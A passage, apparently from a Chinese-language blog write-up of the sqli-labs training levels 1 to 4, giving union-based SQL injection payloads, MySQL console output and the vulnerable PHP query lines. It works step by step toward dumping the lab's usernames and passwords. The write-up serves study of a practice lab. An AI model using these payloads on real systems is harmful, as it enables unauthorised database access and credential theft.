+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; order by 1,2,3#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; order by 1,2,3,4#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>?id=1&#39; order by 1,2,3--+</code>，发现其中存在三行,此时可以通过联合注入的方式进行查询。</p>
+<p><code>?id=-1&#39; union select 1,2,3--+</code>发现在2，3的位置会进行回显。</p>
+<p>因此我们可以开始注入了，一般的思路是获取字段数-&gt;数据库名-&gt;表名-&gt;列名-&gt;值</p>
+<p>字段数就靠上面的order by进行猜解，或者通过union select直接尝试，直到遇到报错。</p>
+<p>我们已知了有3列，而2，3列会回显，因此我们下一步进行查数据库名。</p>
+<p>先在数据库里试一下。有几个常用的查询的默认</p>
+<p>database()：当前网站使用的数据库</p>
+<p>version()：当前Mysql的版本</p>
+<p>user()：当前Mysql的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select version(),user(),database()#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+--------+----------------+----------+</span><br><span class="line">| id     | username       | password |</span><br><span class="line">+--------+----------------+----------+</span><br><span class="line">| 5.7.26 | root@localhost | security |</span><br><span class="line">+--------+----------------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>因此我们再在网站中进行查询，<code>?id=-1&#39; union select 1,user(),database()--+</code>，进而得到数据库名和用户。</p>
+<p>接着查询表。</p>
+<p>同样先试一下</p>
+<p>group_concat()：表示把一个分组的值串起来。</p>
+<p>information_schema：mysql自带的信息数据库存在着存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#x27;security&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+-------------------------------+</span><br><span class="line">| id | username | password                      |</span><br><span class="line">+----+----------+-------------------------------+</span><br><span class="line">|  1 | 2        | emails,referers,uagents,users |</span><br><span class="line">+----+----------+-------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>因此我们再在网站中进行查询，<code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#39;security&#39;--+</code>，得到表名。</p>
+<p>再对user表进行查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema= &#x27;security&#x27; and table_name=&#x27;users&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------------------+</span><br><span class="line">| id | username | password             |</span><br><span class="line">+----+----------+----------------------+</span><br><span class="line">|  1 | 2        | id,username,password |</span><br><span class="line">+----+----------+----------------------+</span><br></pre></td></tr></table></figure>
+
+<p>再在网站中进行查询<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema= &#39;security&#39; and table_name=&#39;users&#39;--+</code>，得到字段名。</p>
+<p>最后查用户名和密码。(格式太丑不放了)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;-1&#x27; union select 1,group_concat(username),group_concat(password) from users#&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>
+
+<p>在网站中查询<code>?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users--+</code></p>
+<p>会回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>
+
+<p>然后差不多就完了，接着下一题。</p>
+<h2 id="Less-2-基于错误的get整型注入"><a href="#Less-2-基于错误的get整型注入" class="headerlink" title="Less-2 基于错误的get整型注入"></a>Less-2 基于错误的get整型注入</h2><p>这题与上一题看起来差不多，只在于一个<code>&#39;&#39;</code>的差别当我们以?<code>id=-1 or 1=1#</code>进行判断报错的时候i，发现返回了整个包裹的<code>&#39; or 1=1 LIMIT 0,1</code>所以可以判断我们多输入了一个<code>&#39;</code>,是多余的，查看代码源码也发现如此</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">//第二题的</span><br></pre></td></tr></table></figure>
+
+<p><code>?id=-1 union select 1,2,3#</code> 判断注入点</p>
+<p><code>?id=-1 union select 1,database(),version()#</code> 取数据库名</p>
+<p><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;#</code>  取表名</p>
+<p><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#</code> 取列</p>
+<p><code>?id=-1 union select 1,group_concat(username),group_concat(password) from users#</code> 取内容</p>
+<h2 id="Less-3-基于错误的get单引号变形字符型注入"><a href="#Less-3-基于错误的get单引号变形字符型注入" class="headerlink" title="Less-3 基于错误的get单引号变形字符型注入"></a>Less-3 基于错误的get单引号变形字符型注入</h2><p>同样用<code>?id=-1&#39; or 1=1#</code>测试，发现返回的错误为<code>&#39;) LIMIT 0,1</code>，证明这次的是用<code>)</code>进行包裹的。</p>
+<p>再次查看源代码，发现确实。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">//第二题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">//第三题的</span><br></pre></td></tr></table></figure>
+
+<p>然后在这里我才意识到<code>?id=-1&#39; or 1=1#</code>是用不了的，而<code>?id=-1&#39; or 1=1--+</code>可以用，我本来以为–+一样是注释符，查了资料才发现，<code>--</code>并不是注释符，而<code>--</code>后还要加上空格，而web中<code>空格</code>和<code>+</code>等价，所以我们一般用<code>--+</code>，其他常用的注释符还有<code>/**/</code>和<code>#</code></p>
+<p>所以这题我们用–+</p>
+<p><code>?id=-1&#39;)  union select 1,2,3--+</code> 找注入点</p>
+<p><code>?id=-1&#39;)  union select 1,database(),user()--+</code> 找数据库名</p>
+<p><code>?id=-1&#39;)  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code> 取表名</p>
+<p><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39;and table_name=&#39;users&#39;--+</code>  取列</p>
+<p><code>?id=-1&#39;) union select 1,group_concat(username),group_concat(password) from users--+</code> 取内容</p>
+<h2 id="Less-4-基于错误的GET双引号字符型注入"><a href="#Less-4-基于错误的GET双引号字符型注入" class="headerlink" title="Less-4 基于错误的GET双引号字符型注入"></a>Less-4 基于错误的GET双引号字符型注入</h2><p>还是先试一下<code>?id=-1&#39; or 1=1#</code>，然后发现没有任何报错的反应，然后我选择直接看了源码，发现这次的代码与之前有所不同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">//第三题的</span><br><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br><span class="line">//第四题</span><br></pre></td></tr></table></figure>
+
+<p><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</code> 表示在php中.是用来连接的，表示把$id存储的值加上一个双引号然后在赋值给$id 这个变量，很明显我们这题要用到双引号的绕过。</p>
+<p>当我们将用<code>?id=1&quot;</code>进行报错的验证，会发现返回的错误为<code>&quot;1&quot;&quot;) LIMIT 0,1</code>，从而可以判断在该处要进行双引号和括号的闭合</p>
+<p><code>?id=-1&quot;) union select 1,2,3--+</code> 找注入点</p>
+<p><code>?id=-1&quot;) union select 1,database(),user()--+</code> 找数据库</p>
+<p><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code> 找表名</p>
+<p><code>?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+</code> 找列名</p>
+<p><code>?id=-1&quot;) union select 1,group_concat(username),group_concat(password) from users--+</code> 取数</p>
+<h2 id="Less-5-双注入GET单引号字符型注入"><a href="#Less-5-双注入GET单引号字符型注入" class="headerlink" title="Less-5 双注入GET单引号字符型注入"></a>Less-5 双注入GET单引号字符型注入</h2>
       
     </div>
 
